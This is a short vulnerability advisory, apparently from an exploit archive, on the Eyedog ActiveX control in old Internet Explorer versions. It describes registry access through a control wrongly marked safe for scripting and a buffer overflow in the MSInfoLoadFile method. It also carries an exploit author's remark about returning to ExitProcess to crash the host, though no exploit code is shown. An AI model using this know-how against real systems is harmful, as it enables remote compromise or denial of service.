Microsoft Internet Explorer 4.0/5.0 for Windows 95/Windows NT 4/Windows 2000/Windows 95/Windows 98 ActiveX "Eyedog" Vulnerability

source: https://www.securityfocus.com/bid/619/info

The Eyedog ActiveX control is marked 'safe for scripting' although it permits registry access and other information gathering methods to be used. It also contains a buffer overflow error. These weaknesses can be exploited remotely via a malicious webpage or email.

With this control, MSInfoLoadFile is the offending method.
There is no easy way to RET to our code, so instead, I have
shown how to simply RET to ExitProcess directly. This will
cause the host to terminate.
